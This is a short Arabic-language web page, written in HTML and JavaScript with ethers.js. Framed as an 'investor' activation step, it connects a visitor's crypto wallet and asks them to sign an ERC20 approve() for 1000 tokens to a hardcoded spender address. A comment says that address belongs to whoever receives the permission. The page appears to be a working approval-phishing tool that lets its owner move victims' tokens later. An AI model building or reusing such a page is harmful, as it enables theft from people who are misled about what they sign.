<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <title>تفعيل Approve للمستثمر</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.min.js"></script>
</head>
<body>
  <h2>أدخل عنوان التوكن ERC20</h2>
  <input type="text" id="tokenAddress" placeholder="مثال: 0xdAC17F958D2ee523a2206206994597C13D831ec7" style="width: 400px;" />
  <br /><br />
  <button id="approveBtn">اعمل Approve 1000</button>

  <script>
    const spenderAddress = "0xaB63dd850a8C2EDD526fF2D929187B94E03F777D"; // عنوان محفظتك اللي هتاخد الصلاحية

    const erc20Abi = [
      "function approve(address spender, uint256 amount) public returns (bool)",
      "function decimals() view returns (uint8)",
    ];

    async function approve() {
      try {
        if (!window.ethereum) {
          alert("يرجى تثبيت MetaMask أو محفظة تدعم Ethereum.");
          return;
        }

        await window.ethereum.request({ method: 'eth_requestAccounts' });
        const provider = new ethers.BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();

        const tokenAddress = document.getElementById("tokenAddress").value.trim();
        if (!ethers.isAddress(tokenAddress)) {
          alert("عنوان التوكن غير صحيح!");
          return;
        }

        const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, signer);

        // جلب عدد الديسيمالز عشان نحول 1000 للـ wei الصحيح
        const decimals = await tokenContract.decimals();
        const amountToApprove = ethers.parseUnits("1000", decimals);

        const tx = await tokenContract.approve(spenderAddress, amountToApprove);
        alert("تم إرسال طلب الموافقة، رقم العملية: " + tx.hash);

        await tx.wait(); // انتظار تأكيد العملية
        alert("تمت الموافقة بنجاح!");
      } catch (error) {
        console.error(error);
        alert("حدث خطأ: " + error.message);
      }
    }

    document.getElementById("approveBtn").onclick = approve;
  </script>
</body>
</html>
